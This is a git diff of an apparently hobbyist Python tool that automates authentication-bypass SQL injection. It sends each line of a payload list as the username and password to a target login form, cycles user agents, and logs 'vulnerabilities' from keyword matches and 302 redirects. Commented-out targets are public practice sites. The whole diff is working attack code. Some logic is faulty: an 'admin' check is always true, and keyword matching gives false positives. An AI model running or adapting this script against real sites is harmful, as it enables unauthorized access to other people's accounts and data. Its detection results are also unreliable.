@@ -15,18 +15,24 @@ lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'script
 sys.path.append(lib_path)
 import sys
 import os
+from lib.scripts.headers import Prepare_the_headers
+from lib.scripts.headers import headers
+from lib.scripts.headers import header
+from  lib.regelexpression.patterns import Detect
+from lib.priority.Priority import PRIORITY
+from lib.priority.Priority import HARMFULL
+from logger.logs import logger
+from lib.result.Results import safe_SQLJNG_result
+from lib.result.Results import SQLJNG_result_report
+from Exceptions.exceptions import SQLJNGStackRangeError
+from lib.Stacks.stack import html_response
+from lib.scripts.headers import *
 
-from headers import *
 
-
-
-from headers import *
 
 import logging
 
-############################################################################
 attack_type = "authentication bypass SQL injection"
-#############################################################################
 
 """
 Function: mysql_extract_value_injection
@@ -67,20 +73,16 @@ for url in urls_to_attack:
 
 
 
-####################################33
 pattern = r"\berror\b"
 htmlpattern = r"\bid\b"
 capturesAUTHBYPASS = []
-########################################
-#* Setting a couple of user agents
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
 }
 
-###############################################
 
 
-#
+
 logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 
@@ -99,135 +101,98 @@ async def Extract_value_injection(urls):
             rows = payload.split("\n") 
             sorted_rows = sorted(rows) 
             sorted_payload = "\n".join(sorted_rows) #* 
-            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
-            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
+            logger.info(f"Payload:{sorted_payload} \n is ready to be send")
+            requests.packages.urllib3.disable_warnings()  #
             # url = "https://redtiger.labs.overthewire.org/level1.php"
             req = requests.get(url=urls,verify=False) 
-            # assert req.status_code == 200
             if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
-                logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"): 
-                        #############################################################33
                         params = { 
                             "username": line,
                             "password": line
                         }
-                        ##############################################################################
-                        # print(line)
                         await Prepare_the_headers()
                         for headerR in headers:
                             ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
-                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
-                            # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
+                            logger.info(f"Sending payload:{line} to the target.")
+
                             await asyncio.sleep(5) 
                             if "error" in ack.text: 
-                                print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
+                                logger.info("Error parameter might exists in the response code.")
+                                Detect(ack.text)
+                                await asyncio.sleep(3)
+                                html_response.push(ack.text)
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: 
-                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
-                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
-                                await asyncio.sleep(3) 
+                                logger.info("Id parameter might exists in the code.")
+                                Detect(ack.text)
+                                await asyncio.sleep(4)
+                                html_response.push(ack.text)
+
                             
                             if htmlVULN:
-                                print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
-                                logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
+                                logger.info(f"could find error parameter in the response code of html.")
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
+                                html_response.push(ack.text)
+
                             
                             word = "id" in req.text                             
                             errword = "error" in req.text
                             if word:
-                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
-                                logging.info(f"[INFO] vulnerability may exists in the target url(id parameters):{urls} attack type:{attack_type} in the time:{datetime.now()}")
+                                logger.info("Id parameter might exists in the response.")
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
+                                html_response.push(ack.text)
+
                             
                             if errword:
-                                print(f"[{datetime.now()}]",Fore.RED + "|**Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",header)
-                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
-                                await asyncio.sleep(3)
-                                
-                            
+                                logger.info("Error parameter might exists in the response.")
+                                Detect(ack.text)
+                                html_response.push(ack.text)
+
                                 
                         if req.status_code == 302:                                             
-                            print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
-                            logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
-                            done = True
+                            logger.info("Could break into the server")
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
-                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]**Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",headers)
-                            logging.info(f"Could not find any injectable significant area in the target:{urls} in the time:{datetime.now()}")
+                            logger.info("Admin parameter might exists in the code.")
+                            Detect(ack.text)
+                            await asyncio.sleep(3)
+                            html_response.push(ack.text)
+
                             
                 else:
-                    print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
-                    logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
+                    logger.error("Host is down.")
             
-        # await create_database_for_Captures()
-        conn = sqlite3.connect("SQLJresult.db")
-        cur = conn.cursor()
 
-        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
-        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
-        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]
-
-        cur.executemany(sql, values)
-
-        conn.commit()
-        conn.close()
-        #############################################################################################################
     except Exception as e:
         print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
         
     except KeyboardInterrupt:
-        pass
+        sys.exit("Aborted by user.")
         
-    except ConnectionAbortedError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionRefusedError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionResetError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
-        
-    except UnicodeEncodeError:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
-    
-    except AssertionError:
-        pass
-        
-    except MemoryError:
-        """We handle the memory and RAM error in here to catch this exception """
-        import psutil
-        # Get the system memory information
-        memory = psutil.virtual_memory()
 
-        # Calculate the threshold for 80% memory usage
-        threshold = memory.total * 0.9
-
-        # Check if the used memory is greater than the threshold
-        Err =  memory.used <= threshold
-        while not Err:
-            memory = psutil.virtual_memory()
-            Err = memory.used <= threshold
-            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
-            await asyncio.sleep(5)
-# asyncio.run(Memory_handling())
         
     finally:
-        pass
+        try:
+            await SQLJNG_result_report(html_response)
+        
+        except SQLJNGStackRangeError:
+            result = safe_SQLJNG_result(html_response)
+            for res in result:
+                logger.setLevel(logging.INFO)
+                logger.info("Result")
+                logger.setLevel(logging.CRITICAL)
      
         
         
      
 
-# async def auth_main(urL):
-#     await auth_SQL_inj(urL)
 
 # asyncio.run(Extract_value_injection("http://testfire.net/login.jsp"))
